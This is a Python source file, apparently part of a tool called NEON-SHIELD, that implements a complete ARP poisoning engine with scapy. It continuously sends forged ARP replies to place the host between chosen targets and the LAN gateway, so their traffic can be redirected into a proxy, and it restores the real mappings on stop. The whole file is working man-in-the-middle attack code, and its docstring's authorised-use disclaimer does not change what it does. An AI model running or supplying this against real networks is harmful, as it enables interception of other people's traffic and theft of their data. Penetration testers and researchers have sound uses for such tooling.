"""
ARP poisoning engine for NEON-SHIELD auto mode.

Places this host in the traffic path between one or more target devices and
the LAN gateway by sending forged ARP replies, so their traffic transits this
machine and can be transparently redirected into the proxy. Restores the
real ARP mappings on stop so victims' connectivity returns to normal.

Only intended for use against devices/networks you own or are explicitly
authorized to test -- see README.md disclaimer.
"""
import threading
import time

from scapy.all import ARP, Ether, sendp, srp, conf


def _get_mac(ip, iface, timeout=3):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(packet, timeout=timeout, iface=iface, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


class ArpSpoofer:
    """
    Continuously poisons ARP caches for a set of target IPs against a
    gateway IP, running in a background thread. Call start(), then stop()
    to cleanly restore ARP tables.
    """

    def __init__(self, iface, gateway_ip, target_ips, interval=2):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.target_ips = list(target_ips)
        self.interval = interval

        self._stop_event = threading.Event()
        self._thread = None
        self._mac_cache = {}

        self.gateway_mac = _get_mac(gateway_ip, iface)
        if not self.gateway_mac:
            raise RuntimeError(f"Could not resolve MAC address for gateway {gateway_ip}")
        self._mac_cache[gateway_ip] = self.gateway_mac

    def _resolve(self, ip):
        if ip not in self._mac_cache:
            mac = _get_mac(ip, self.iface)
            if mac:
                self._mac_cache[ip] = mac
        return self._mac_cache.get(ip)

    def _poison_once(self, target_ip, target_mac):
        # Tell the target: "I am the gateway"
        sendp(
            Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=self.gateway_ip,
            ),
            iface=self.iface, verbose=False,
        )
        # Tell the gateway: "I am the target"
        sendp(
            Ether(dst=self.gateway_mac) / ARP(
                op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                psrc=target_ip,
            ),
            iface=self.iface, verbose=False,
        )

    def _restore_once(self, target_ip, target_mac):
        # Tell the target the gateway's real MAC, and vice versa.
        sendp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=self.gateway_ip, hwsrc=self.gateway_mac,
            ),
            iface=self.iface, count=3, verbose=False,
        )
        sendp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                psrc=target_ip, hwsrc=target_mac,
            ),
            iface=self.iface, count=3, verbose=False,
        )

    def _run(self):
        while not self._stop_event.is_set():
            for target_ip in list(self.target_ips):
                target_mac = self._resolve(target_ip)
                if not target_mac:
                    continue
                try:
                    self._poison_once(target_ip, target_mac)
                except Exception as e:
                    print(f"[ArpSpoof] Failed to poison {target_ip}: {e}")
            self._stop_event.wait(self.interval)

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print(f"[ArpSpoof] Poisoning {len(self.target_ips)} target(s) <-> gateway {self.gateway_ip}")

    def stop(self):
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)

        print("[ArpSpoof] Restoring ARP tables for all targets...")
        for target_ip in self.target_ips:
            target_mac = self._mac_cache.get(target_ip)
            if target_mac:
                try:
                    self._restore_once(target_ip, target_mac)
                except Exception as e:
                    print(f"[ArpSpoof] Failed to restore {target_ip}: {e}")
        print("[ArpSpoof] ARP tables restored.")

    def add_target(self, ip):
        if ip not in self.target_ips:
            self.target_ips.append(ip)
